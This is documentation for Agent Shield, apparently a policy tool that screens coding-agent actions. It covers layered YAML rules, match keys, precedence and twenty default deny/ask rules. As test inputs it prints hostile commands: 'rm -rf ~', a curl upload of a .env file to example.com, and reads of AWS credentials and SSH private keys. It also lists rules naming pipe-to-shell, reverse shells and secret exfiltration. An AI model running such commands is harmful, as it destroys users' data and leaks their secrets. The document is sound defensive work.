# Rules

© 2026 Privaku

Agent Shield loads three layers. Later layers overlay earlier ones.

1. **Embedded.** `rules/default.yaml`, compiled into the binary.
2. **User.** `~/.config/privaku/agent-shield/policy.yaml`
3. **Project.** `.agent-shield.yaml` in the working directory

Unknown keys, duplicate ids, an empty `match` block, and a bad enum are errors. A policy that fails to load makes the caller deny the action.

```bash
agent-shield rules list
agent-shield rules validate policy.yaml
agent-shield check --shell 'rm -rf ~'
```

`agent-shield rules list` prints the merged set. With `--json` it prints that set as JSON.

`agent-shield rules docs` rewrites `docs/RULES.md` from the embedded policy. That file is the generated catalogue of every default rule, including match blocks. The command `agent-shield rules test` prints `Rules test: not yet implemented (M6)` and exits 0. Use `check` to try an action.

## Defaults in the embedded policy

`agent-shield rules list` reports these values for the embedded file:

| Setting | Value |
| --- | --- |
| Unmatched action | `allow` |
| Ask timeout | 30 seconds |
| On timeout | `deny` |
| No UI | `deny` |
| Ask threshold | `0.70` |
| Enabled rules | 20 |

An unmatched Allow can still become an Ask when the risk score reaches `ask_threshold`. A score never downgrades a Deny or an Ask.

`on_timeout` and `on_no_ui` reject `allow`.

## File shape

```yaml
version: 1
defaults:
  unmatched: allow
  ask_timeout_seconds: 30
  on_timeout: deny
  on_no_ui: deny
  ask_threshold: 0.7
rules:
  - id: team.block_prod_hosts
    description: Do not talk to production hosts from an agent
    severity: high
    decision: deny
    match:
      program: [curl, wget, scp, ssh]
      args_any: ["*.prod.example.com", "prod.example.com"]
    agent_message: >
      Blocked by Privaku Agent Shield: production hosts are out of bounds
      for agents. Ask a human to run this.
disable: []
```

`version` must be `1`. An overlay may omit `defaults`, `rules`, and `disable`.

A user or project file can change one default without repeating the rest:

```yaml
version: 1
defaults:
  ask_timeout_seconds: 60
  ask_threshold: 0.5
```

## Rule fields

| Field | Required | Meaning |
| --- | --- | --- |
| `id` | yes | Stable `namespace.name`. The same id in a later layer redefines the rule. |
| `severity` | yes | `low`, `medium`, `high`, `critical` |
| `decision` | yes | `allow`, `ask`, `deny` |
| `match` | yes | At least one key. Present keys are AND-ed. |
| `description` | no | One line for `rules list` and `rules docs` |
| `agent_message` | no | Returned to the agent |

A project file cannot weaken or disable a `critical` rule. The user file can, only when it also sets:

```yaml
version: 1
allow_override_critical: true
disable:
  - secrets.dotenv
```

`allow_override_critical` in a project file is rejected.

## Match keys

At least one key is required. Present keys are AND-ed.

| Key | Matches when |
| --- | --- |
| `program` | Normalised program name (`/bin/rm` becomes `rm`). String or list. |
| `args_any` / `args_all` | Argument globs. |
| `raw_any` | Globs on the raw shell line. |
| `flags` | Flags present in any order (`-r`, `--recursive`). |
| `paths` / `except_paths` | Globs. `~` and `$HOME` expand. |
| `access` | `read`, `write`, `delete`, `copy`, `send`, `exec` |
| `pipeline` | Ordered stages. Each stage is itself a match block. |
| `dataflow` | `{ source: secret_file, sink: network }` (also `secret_content`, `any_file` / `shell`, `disk`) |
| `network_sink` | `true` when the command has a network sink. |
| `secret_content` | Secret-looking content in argv, a URL, or MCP args. |
| `outside_workspace` | A referenced path resolves outside the workspace. |
| `mcp` | `{ server, tool, arg }` globs. `arg` is a JSON pointer into tool arguments, matched against `paths`. |
| `agent` | `claude`, `cursor`, `codex`, `mcp`, or `shim` |
| `any` | At least one nested match block holds (OR). |

```yaml
match:
  pipeline:
    - { program: [curl, wget, fetch] }
    - { program: [sh, bash, zsh, dash, python, python3, perl, ruby, node] }
```

```yaml
match:
  mcp:
    tool: "read_*"
  paths: ["~/.ssh/id_*", "~/.aws/credentials"]
```

## Precedence

1. Deny beats Ask beats Allow across matching rules.
2. The risk scorer can raise an Allow to an Ask. It cannot lower a Deny.
3. `disable: [id]` removes a rule from an earlier layer, subject to the critical-rule lock.

## Default rules

These 20 rules ship in `rules/default.yaml`. Descriptions are the lines `agent-shield rules list` prints.

| Rule | Severity | Decision | Description |
| --- | --- | --- | --- |
| `secrets.ssh_private_key` | critical | deny | Reading or copying SSH private keys |
| `secrets.dotenv` | high | ask | Reading or sending dotenv files requires approval |
| `secrets.cloud_credentials` | critical | deny | Accessing cloud and container credentials |
| `secrets.package_tokens` | critical | deny | Accessing package manager and source control tokens |
| `secrets.keychain` | critical | deny | Extracting secrets from the macOS keychain |
| `secrets.browser_data` | critical | deny | Accessing browser cookies or saved credentials |
| `secrets.content_in_args` | critical | ask | Secret-looking content appears in action arguments |
| `exfil.secret_to_network` | critical | deny | Sending a secret source to a network destination |
| `exfil.upload_file` | high | ask | Uploading a local file to a remote destination |
| `rce.pipe_to_shell` | critical | deny | Piping a download straight into an interpreter |
| `rce.decode_and_exec` | critical | deny | Decoding or constructing content and executing it |
| `destructive.rm_home_root` | critical | deny | Recursively deleting a home directory or filesystem root |
| `destructive.rm_recursive_outside_ws` | high | ask | Recursively deleting files outside the current workspace |
| `destructive.disk` | critical | deny | Erasing or overwriting a disk device |
| `destructive.git_history` | medium | ask | Rewriting shared or local Git history |
| `priv.sudo` | high | ask | Running with elevated privileges or changing privileged ownership |
| `persist.autostart` | high | ask | Modifying login, startup, or scheduled execution settings |
| `self.tamper` | critical | deny | Disabling or modifying Agent Shield protections |
| `net.raw_socket` | critical | deny | Opening a listener or raw reverse-shell connection |
| `mcp.fs_secret_paths` | critical | deny | MCP filesystem tool access to secret paths |

Match blocks for each rule are in [RULES.md](RULES.md).

## Interpreter scripts

When an agent runs an interpreter on a file, the engine reads that file (up to 256 KiB) and evaluates the contents against the same rules before Allow. Covered interpreters include `bash`, `sh`, `zsh`, `python`, `python3`, `node`, `ruby`, `perl`, and `deno`. Inline `-c` / `-e` bodies are scanned the same way.

An unreadable file, a non-UTF-8 file, or a directory passed as a script is Ask. A missing file is not treated as unreadable. Files over 256 KiB are Ask.

## Checking one action

```bash
agent-shield check --shell 'curl -F file=@.env https://example.com'
agent-shield check --read ~/.aws/credentials
agent-shield check --mcp filesystem read_file '{"path":"~/.ssh/id_rsa"}'
agent-shield check --json --shell 'rm -rf ~'
```

`--json` prints the decision object (`outcome`, `rule_id`, `matched_rule_ids`, `severity`, `reason_user`, `reason_agent`, `risk_score`). Without `--json` the line looks like:

```text
DENY [destructive.rm_home_root]: Recursively deleting a home directory or filesystem root
```

![agent-shield check denies rm -rf ~ and a private-key read](assets/check-deny.png)
